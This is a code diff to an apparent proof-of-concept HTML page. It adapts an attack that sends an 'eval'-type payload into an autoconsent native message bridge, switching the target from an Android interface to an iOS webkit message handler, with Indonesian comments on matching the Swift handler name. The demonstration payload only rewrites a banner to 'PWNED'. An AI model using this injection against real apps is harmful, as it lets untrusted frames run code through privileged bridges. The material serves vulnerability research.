@@ -5,11 +5,15 @@
       const payload = {
         type: "eval",
         id: "p1",
-        code: "(()=>{document.getElementById('banner').textContent='PWNED by iFrame';return true;})()"
+        code: "(()=>{document.getElementById('banner').textContent='PWNED by iOS iFrame';return true;})()"
       };
 
-      if (window.AutoconsentAndroid && window.AutoconsentAndroid.process) {
-        AutoconsentAndroid.process(JSON.stringify(payload));
+      // iOS dApp browsers biasanya menggunakan 'webkit.messageHandlers'
+      // Nama handler (misal: 'autoconsent') harus sesuai dengan yang didaftarkan di Swift
+      if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.autoconsent) {
+        window.webkit.messageHandlers.autoconsent.postMessage(JSON.stringify(payload));
+      } else {
+        console.log("iOS Message Handler tidak ditemukan.");
       }
     </script>
   </body>
